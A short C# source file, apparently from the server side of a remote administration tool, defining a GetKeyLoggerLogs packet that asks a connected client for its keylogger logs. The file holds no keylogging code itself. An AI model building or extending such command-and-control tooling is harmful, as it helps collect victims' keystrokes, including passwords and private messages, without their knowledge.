using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetKeyLoggerLogs : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetKeyLoggerLogs;
            }
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
